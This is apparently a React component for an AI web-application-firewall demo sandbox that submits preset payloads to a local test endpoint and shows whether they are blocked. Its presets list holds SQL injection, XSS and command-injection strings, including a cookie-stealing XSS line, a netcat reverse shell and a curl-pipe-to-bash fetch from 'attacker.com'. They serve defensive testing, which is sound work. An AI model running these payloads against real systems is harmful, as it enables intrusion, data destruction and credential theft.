import React, { useState } from 'react'

function Sandbox({ onRefreshLogs }) {
  const [payloadType, setPayloadType] = useState('sqli')
  const [customPayload, setCustomPayload] = useState("1' OR '1'='1")
  const [consoleLines, setConsoleLines] = useState([
    { text: 'AI-WAF Threat Sandbox Initialized.', type: 'info' },
    { text: 'Ready to receive payload tests. Choose a preset or write your own.', type: 'info' }
  ])
  const [loading, setLoading] = useState(false)

  // Presets mapping
  const presets = {
    sqli: [
      { name: "Classic Bypass", text: "admin' OR '1'='1" },
      { name: "Union Dump", text: "1' UNION SELECT 1, username, password FROM users --" },
      { name: "Table Eraser", text: "product_id=54; DROP TABLE products; --" },
      { name: "Blind Sleep", text: "1' AND SLEEP(5) --" }
    ],
    xss: [
      { name: "Basic Alert", text: "<script>alert('XSS-Target')</script>" },
      { name: "Image Error", text: "<img src=x onerror=\"alert(document.cookie)\">" },
      { name: "SVG Injection", text: "<svg onload=alert(1)>" },
      { name: "Href Redirect", text: "<a href=\"javascript:alert('Clicked')\">Claim Prize</a>" }
    ],
    cmd: [
      { name: "System Traversal", text: "; cat /etc/passwd" },
      { name: "Folder List", text: "&& dir C:\\Windows\\" },
      { name: "Reverse Shell", text: "| nc -e /bin/sh 10.0.0.1 4444" },
      { name: "Web Fetch", text: "&& curl http://attacker.com/shell.sh | bash" }
    ],
    benign: [
      { name: "Text Search", text: "best gaming laptop 2026 under $1000" },
      { name: "Product Review", text: "The quality of this leather wallet is amazing. Fast shipping!" },
      { name: "Complex JSON", text: '{"query": "wireless mouse", "sort": "rating", "limit": 10}' },
      { name: "Normal Email", text: "support.team@mgit.edu.in" }
    ]
  }

  const handleSelectPreset = (text) => {
    setCustomPayload(text)
  }

  const handlePayloadTypeChange = (type) => {
    setPayloadType(type)
    setCustomPayload(presets[type][0].text)
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    if (!customPayload.trim()) return

    setLoading(true)
    
    // Add request to terminal
    const requestTime = new Date().toLocaleTimeString()
    const newLines = [
      { text: `\n[${requestTime}] >>> POST /api/test/submit`, type: 'prompt' },
      { text: `Content-Type: application/json`, type: 'info' },
      { text: `Payload Content: "${customPayload}"`, type: 'info' },
      { text: `Sending query to Spring Boot filter for AI inspection...`, type: 'info' }
    ]
    setConsoleLines(prev => [...prev, ...newLines])

    try {
      const res = await fetch('/api/test/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          inputData: customPayload
        })
      })

      const status = res.status
      const data = await res.json()

      const responseTime = new Date().toLocaleTimeString()
      
      if (status === 200) {
        setConsoleLines(prev => [
          ...prev,
          { text: `[${responseTime}] <<< HTTP/1.1 200 OK`, type: 'success' },
          { text: `WAF Result: ALLOWED (benign request passed)`, type: 'success' },
          { text: `Response JSON: ${JSON.stringify(data, null, 2)}`, type: 'info' }
        ])
      } else if (status === 403) {
        setConsoleLines(prev => [
          ...prev,
          { text: `[${responseTime}] <<< HTTP/1.1 403 Forbidden`, type: 'error' },
          { text: `WAF Result: BLOCKED (malicious payload intercepted)`, type: 'error' },
          { text: `Threat Category: ${data.attack_category}`, type: 'error' },
          { text: `AI Confidence Score: ${data.threat_confidence}`, type: 'error' },
          { text: `Audit Log ID: #${data.event_id}`, type: 'info' },
          { text: `Response JSON: ${JSON.stringify(data, null, 2)}`, type: 'info' }
        ])
      } else {
        setConsoleLines(prev => [
          ...prev,
          { text: `[${responseTime}] <<< HTTP/1.1 ${status} Error`, type: 'error' },
          { text: `Response: ${JSON.stringify(data)}`, type: 'info' }
        ])
      }

      // Notify parent app to poll updated logs
      if (onRefreshLogs) onRefreshLogs()

    } catch (err) {
      setConsoleLines(prev => [
        ...prev,
        { text: `[ERROR] Failed to send request: ${err.message}`, type: 'error' }
      ])
    } finally {
      setLoading(false)
      // Auto scroll terminal to bottom
      setTimeout(() => {
        const term = document.getElementById('terminal-view')
        if (term) term.scrollTop = term.scrollHeight
      }, 50)
    }
  }

  const handleClearConsole = () => {
    setConsoleLines([
      { text: 'AI-WAF Threat Sandbox Terminal Cleared.', type: 'info' }
    ])
  }

  return (
    <div className="glass-card">
      <h3 className="card-title">🧪 AI-WAF Security Sandbox</h3>
      <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', marginBottom: '1.5rem' }}>
        Submit request payloads below to see how the Spring Boot filter catches them. Benign payloads will proceed to the target API, while SQLi, XSS, and Command Injections will be blocked with a 403 Forbidden response code.
      </p>

      <div className="sandbox-split">
        {/* Left Side: Input Form */}
        <div>
          {/* Category Tabs */}
          <div style={{ display: 'flex', gap: '0.25rem', marginBottom: '1rem', borderBottom: '1px solid var(--border-glass)', paddingBottom: '0.5rem' }}>
            <button 
              className={`nav-btn ${payloadType === 'sqli' ? 'active' : ''}`}
              onClick={() => handlePayloadTypeChange('sqli')}
              style={{ padding: '0.4rem 0.8rem', fontSize: '0.85rem' }}
            >
              💉 SQL Injection
            </button>
            <button 
              className={`nav-btn ${payloadType === 'xss' ? 'active' : ''}`}
              onClick={() => handlePayloadTypeChange('xss')}
              style={{ padding: '0.4rem 0.8rem', fontSize: '0.85rem' }}
            >
              💻 XSS Scripting
            </button>
            <button 
              className={`nav-btn ${payloadType === 'cmd' ? 'active' : ''}`}
              onClick={() => handlePayloadTypeChange('cmd')}
              style={{ padding: '0.4rem 0.8rem', fontSize: '0.85rem' }}
            >
              🐚 Command Inj.
            </button>
            <button 
              className={`nav-btn ${payloadType === 'benign' ? 'active' : ''}`}
              onClick={() => handlePayloadTypeChange('benign')}
              style={{ padding: '0.4rem 0.8rem', fontSize: '0.85rem' }}
            >
              😇 Benign Payload
            </button>
          </div>

          {/* Preset Buttons */}
          <div style={{ marginBottom: '1rem' }}>
            <label style={{ display: 'block', fontSize: '0.75rem', color: 'var(--text-secondary)', marginBottom: '0.35rem', textTransform: 'uppercase' }}>
              Select Attack Preset:
            </label>
            <div className="presets-container">
              {presets[payloadType].map((preset, index) => (
                <button
                  key={index}
                  type="button"
                  className={`preset-btn ${customPayload === preset.text ? 'active' : ''}`}
                  onClick={() => handleSelectPreset(preset.text)}
                >
                  {preset.name}
                </button>
              ))}
            </div>
          </div>

          {/* Text Area Form */}
          <form onSubmit={handleSubmit}>
            <div className="form-group">
              <label>Edit HTTP Request Body Payload:</label>
              <textarea
                value={customPayload}
                onChange={(e) => setCustomPayload(e.target.value)}
                placeholder="Write HTTP payload here..."
                className="textarea-input"
              />
            </div>

            <button type="submit" className="btn-primary" disabled={loading}>
              {loading ? (
                <span>📡 Inspecting Request...</span>
              ) : (
                <>
                  <span>⚡ Deploy Payload Check</span>
                </>
              )}
            </button>
          </form>
        </div>

        {/* Right Side: Simulated Terminal Console */}
        <div style={{ display: 'flex', flexDirection: 'column' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.5rem' }}>
            <label style={{ fontSize: '0.8rem', fontWeight: '500', color: 'var(--text-secondary)' }}>
              🖥️ HTTP Log Monitor
            </label>
            <button 
              onClick={handleClearConsole}
              style={{
                background: 'transparent',
                border: 'none',
                color: 'var(--text-muted)',
                fontSize: '0.75rem',
                cursor: 'pointer',
                textDecoration: 'underline'
              }}
            >
              Clear Screen
            </button>
          </div>

          <div className="terminal-output" id="terminal-view">
            <div className="terminal-header">
              <span>HTTP/1.1 REST GATEWAY</span>
              <span>WAF MODE: ACTIVE</span>
            </div>
            {consoleLines.map((line, index) => {
              let lineClass = '';
              let prefix = '';
              if (line.type === 'prompt') {
                lineClass = 'terminal-prompt';
              } else if (line.type === 'success') {
                lineClass = 'terminal-success';
                prefix = '✔ ';
              } else if (line.type === 'error') {
                lineClass = 'terminal-error';
                prefix = '✖ ';
              }
              
              return (
                <div key={index} className={`terminal-line ${lineClass}`}>
                  {prefix}{line.text}
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </div>
  )
}

export default Sandbox
